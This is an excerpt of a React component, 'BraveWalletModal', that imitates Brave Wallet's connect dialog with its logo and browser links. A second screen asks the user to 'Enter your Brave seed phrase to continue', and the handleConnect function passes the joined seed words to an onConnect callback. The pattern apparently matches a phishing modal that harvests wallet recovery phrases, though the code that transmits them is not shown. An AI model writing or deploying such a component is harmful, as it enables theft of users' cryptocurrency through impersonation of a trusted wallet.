...
export default function BraveWalletModal({ onClose, onConnect, onBack }) {
  ...
  const handleConnect = () => {
    ...
    if (!allValid) return;
    if (onConnect) onConnect('Brave Wallet', seedWords.join(' '));
    if (onClose) onClose();
  };
    ...
    <div className="modal-overlay" onClick={(e) => { if (e.target === e.currentTarget) onClose(); }}>
      <div className="modal-content" style={{ maxWidth: 520 }}>
        <div className="modal-header" style={{ position: 'relative', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
          ...
          <h2 style={{ margin: 0, textAlign: 'center' }}>Brave Wallet</h2>
          ...
          {!showSeedInput ? (
            <>
              <div style={{ textAlign: 'center', marginBottom: 24 }}>
                <img src="/icons/brave-logo.svg" alt="Brave Wallet" style={{ width: 60, height: 60, margin: '0 auto 16px', display: 'block' }} />
                <p style={{ margin: 0, fontSize: 14, color: 'var(--text-dim)', lineHeight: 1.5 }}>
                  Brave Wallet is built into Brave Browser for desktop and mobile. Use the links below to open Brave, enable the wallet, or download the app.
                </p>
              </div>

              <div style={{ backgroundColor: 'rgba(255,255,255,0.05)', borderRadius: 12, padding: 20, marginBottom: 20 }}>
                <h3 style={{ margin: '0 0 16px 0', fontSize: 16, fontWeight: 600, color: 'var(--text)' }}>Access Brave Wallet</h3>
                <div style={{ display: 'flex', flexDirection: 'column', gap: 12 }}>
                  ...
                  >
                    <div style={{ display: 'flex', alignItems: 'center', gap: 12 }}>
                      ...
                      <span style={{ fontSize: 14, fontWeight: 500 }}>Brave Browser</span>
                    </div>
            ...
            <>
              <p style={{ textAlign: 'center', color: 'var(--text-dim)', marginBottom: 20, fontSize: 14 }}>
                Enter your Brave seed phrase to continue.
              </p>
